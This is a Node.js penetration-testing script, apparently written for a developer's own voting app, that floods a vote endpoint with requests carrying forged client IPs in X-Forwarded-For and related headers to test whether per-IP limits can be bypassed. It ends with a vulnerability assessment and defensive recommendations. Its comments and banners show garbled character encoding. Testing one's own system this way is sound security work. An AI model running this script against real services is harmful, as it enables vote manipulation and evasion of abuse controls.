#!/usr/bin/env node

/**
 * PENTEST SCRIPT: IP Spoofing Attack
 *
 * Má»¥c tiÃªu: Giáº£ máº¡o IP address Ä‘á»ƒ bypass IP-based tracking
 * Severity: HIGH
 *
 * Usage:
 *   node 02-ip-spoofing.js <infrastructure-id> [count] [base-url]
 *
 * Example:
 *   node 02-ip-spoofing.js clx123abc 50
 */

const BASE_URL = process.argv[4] || 'http://localhost:3000';
const INFRASTRUCTURE_ID = process.argv[2];
const VOTE_COUNT = parseInt(process.argv[3] || '50', 10);

if (!INFRASTRUCTURE_ID) {
  console.error('âŒ Error: Infrastructure ID is required');
  console.log('Usage: node 02-ip-spoofing.js <infrastructure-id> [count] [base-url]');
  process.exit(1);
}

console.log(`
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘           ğŸ­ IP SPOOFING ATTACK - PENTEST                â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Target Infrastructure: ${INFRASTRUCTURE_ID}
Fake IP Count: ${VOTE_COUNT}
Base URL: ${BASE_URL}
Attack Type: IP Header Manipulation

[!] This will send votes with fake IP addresses
[!] Testing if the system validates IP headers properly
`);

// Generate random IP address
function generateFakeIP() {
  return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}

// Generate realistic-looking IP addresses
function generateRealisticIPs() {
  const providers = [
    // Vietnamese ISPs
    { prefix: '113.160', name: 'VNPT' },
    { prefix: '115.78', name: 'Viettel' },
    { prefix: '171.224', name: 'FPT' },
    { prefix: '118.69', name: 'SPT' },
    // International
    { prefix: '8.8', name: 'Google' },
    { prefix: '1.1', name: 'Cloudflare' },
    { prefix: '13.250', name: 'AWS Singapore' },
  ];

  const provider = providers[Math.floor(Math.random() * providers.length)];
  return `${provider.prefix}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}

async function createVoteWithFakeIP(index) {
  const fakeIP = generateRealisticIPs();
  const payload = {
    voterName: `User-${index}`,
    voterEmail: `user${index}@example.com`
  };

  try {
    const response = await fetch(`${BASE_URL}/api/infrastructures/${INFRASTRUCTURE_ID}/vote`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        // Try multiple IP spoofing headers
        'X-Forwarded-For': fakeIP,
        'X-Real-IP': fakeIP,
        'X-Client-IP': fakeIP,
        'X-Forwarded': fakeIP,
        'Forwarded-For': fakeIP,
        'Forwarded': `for=${fakeIP}`,
      },
      body: JSON.stringify(payload)
    });

    const data = await response.json();

    if (response.ok) {
      return { success: true, fakeIP, totalVotes: data.totalVotes, index };
    } else {
      return { success: false, fakeIP, error: data.error, index };
    }
  } catch (error) {
    return { success: false, fakeIP, error: error.message, index };
  }
}

async function runAttack() {
  console.log('ğŸš€ Starting IP spoofing attack...\n');

  const startTime = Date.now();
  let successCount = 0;
  let failCount = 0;
  const ipsUsed = new Set();

  // Sequential attack Ä‘á»ƒ dá»… track
  for (let i = 0; i < VOTE_COUNT; i++) {
    const result = await createVoteWithFakeIP(i + 1);

    if (result.success) {
      successCount++;
      ipsUsed.add(result.fakeIP);
      console.log(`âœ… Vote ${i + 1}/${VOTE_COUNT} | IP: ${result.fakeIP} | Total: ${result.totalVotes}`);
    } else {
      failCount++;
      console.log(`âŒ Vote ${i + 1}/${VOTE_COUNT} | IP: ${result.fakeIP} | Error: ${result.error}`);
    }

    // Small delay
    await new Promise(resolve => setTimeout(resolve, 100));
  }

  const endTime = Date.now();
  const duration = (endTime - startTime) / 1000;

  console.log(`\n${'='.repeat(60)}`);
  console.log('ğŸ“Š ATTACK SUMMARY');
  console.log('='.repeat(60));
  console.log(`âœ… Successful votes: ${successCount}`);
  console.log(`âŒ Failed votes: ${failCount}`);
  console.log(`ğŸ­ Unique fake IPs used: ${ipsUsed.size}`);
  console.log(`â±ï¸  Duration: ${duration.toFixed(2)}s`);
  console.log('='.repeat(60));

  console.log('\nğŸ” Sample fake IPs used:');
  Array.from(ipsUsed).slice(0, 10).forEach(ip => {
    console.log(`   â€¢ ${ip}`);
  });

  // Vulnerability assessment
  console.log('\nğŸ” VULNERABILITY ASSESSMENT:');
  if (successCount === VOTE_COUNT) {
    console.log('ğŸ”´ CRITICAL: All votes with fake IPs succeeded!');
    console.log('   â†’ System accepts spoofed IP headers without validation');
    console.log('   â†’ IP-based tracking is completely bypassable');
    console.log('   â†’ Each vote appears to come from different IP');
  } else if (successCount > 0) {
    console.log('ğŸŸ  HIGH: Some votes with fake IPs succeeded');
    console.log(`   â†’ ${successCount} out of ${VOTE_COUNT} fake IPs accepted`);
  } else {
    console.log('ğŸŸ¢ GOOD: No fake IPs accepted');
  }

  console.log('\nğŸ’¡ RECOMMENDATIONS:');
  console.log('  1. Do NOT trust X-Forwarded-For header alone');
  console.log('  2. Use server-side IP detection (e.g., req.socket.remoteAddress)');
  console.log('  3. If behind proxy, validate proxy IP first');
  console.log('  4. Consider using Vercel/Cloudflare built-in IP detection');
  console.log('  5. Implement additional verification beyond IP (auth, email, etc.)');

  console.log('\nğŸ“ VERIFICATION STEPS:');
  console.log('  Check database to verify different IPs were recorded:');
  console.log('  ');
  console.log('  docker-compose exec db psql -U vote -d vote_infrastructure');
  console.log('  SELECT ip_address, COUNT(*) FROM votes');
  console.log('  WHERE infrastructure_id = \'' + INFRASTRUCTURE_ID + '\'');
  console.log('  GROUP BY ip_address ORDER BY COUNT(*) DESC;');
}

console.log('âš ï¸  WARNING: This will spoof IP addresses!');
console.log('   Press Ctrl+C to cancel, or wait 3 seconds to continue...\n');

setTimeout(() => {
  runAttack().catch(error => {
    console.error('\nâŒ Attack failed:', error.message);
    process.exit(1);
  });
}, 3000);
